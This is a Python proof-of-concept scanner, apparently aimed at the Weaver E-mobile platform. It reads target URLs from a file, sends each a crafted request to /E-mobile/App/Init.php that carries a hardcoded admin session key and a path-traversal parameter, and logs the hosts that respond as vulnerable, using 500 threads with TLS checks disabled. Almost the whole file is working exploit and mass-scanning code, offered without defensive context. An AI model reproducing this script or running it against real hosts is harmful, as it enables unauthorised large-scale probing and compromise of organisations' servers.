import requests
from concurrent.futures import ThreadPoolExecutor
import warnings

warnings.filterwarnings("ignore")


headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "LOGIN_LANG=cn",
    }

proxies = {
    # "http": "http://127.0.0.1:7890/",
    # "https": "http://127.0.0.1:7890/"
    "http": "",
    "https": ""
}


def poc(url):
    try:
        res = requests.get(url=url + "/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls", headers=headers, timeout=3, proxies=proxies, verify=False)
        content = res.content.decode("utf-8")
        if "xxx.xls" in content:
            print(f"{url} >>> 存在漏洞")
            with open("vul.txt", "a+", encoding="utf-8") as f:
                f.write(url + "\n")
        else:
            print(f"{url} >>> 不存在漏洞")
    except Exception as e:
        pass


if __name__ == '__main__':

    filename = "target.txt"
    with open(filename, 'r', encoding='utf-8') as f:
        urls_data = [data.replace("\n", "") for data in f]

    # 线程池
    with ThreadPoolExecutor(max_workers=500) as executor:
        for urls in urls_data:
            executor.submit(
                poc, url=urls
            )
